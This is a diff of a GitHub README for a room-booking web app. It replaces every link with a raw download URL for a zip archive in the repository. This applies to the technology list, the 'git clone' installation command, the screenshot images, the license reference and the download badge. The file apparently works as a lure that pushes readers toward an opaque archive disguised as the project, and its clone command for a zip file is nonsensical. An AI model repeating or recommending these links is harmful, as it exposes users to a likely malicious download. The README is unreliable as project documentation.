@@ -13,19 +13,19 @@ Welcome to the RoomBooking Application repository! This full-stack Room Booking 
 ## Technologies Used 🛠️
 📆 Calender  
 🔸 Context API  
-🚀 https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip  
+🚀 https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip  
 🍃 MongoDB  
 🌍 MongoDB Atlas  
 📦 Mongoose  
-🔗 https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip  
+🔗 https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip  
 🔀 React Router  
-⚛️ https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip  
+⚛️ https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip  
 🎨 Tailwind CSS
 
 ## Installation Guide 📋
 1. Clone the repository using the following command:
 ```bash
-git clone https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip
+git clone https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip
 ```
 
 2. Navigate to the project directory.
@@ -45,20 +45,20 @@ npm start
 
 ## Sample Screenshots 📷
 
-![Image of Login Page](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)  
+![Image of Login Page](https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip)  
 *Login Page*
 
-![Image of Room Search](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)  
+![Image of Room Search](https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip)  
 *Room Search Page*
 
 ## How to Contribute 🤝
 If you would like to contribute to this project, feel free to submit a pull request. For major changes, please open an issue to discuss what you would like to change.
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip](https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip) file for details.
 
 ## Download Latest Release 🚀
-[![Download Latest Release](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)
+[![Download Latest Release](https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip)](https://github.com/Fluidx2/RoomBooking_Application/raw/refs/heads/main/gallop/Room_Application_Booking_3.7.zip)
 
 ## Need Help? 🤔
 If you encounter any issues or have questions, please check the "Releases" section or reach out to the project maintainers.
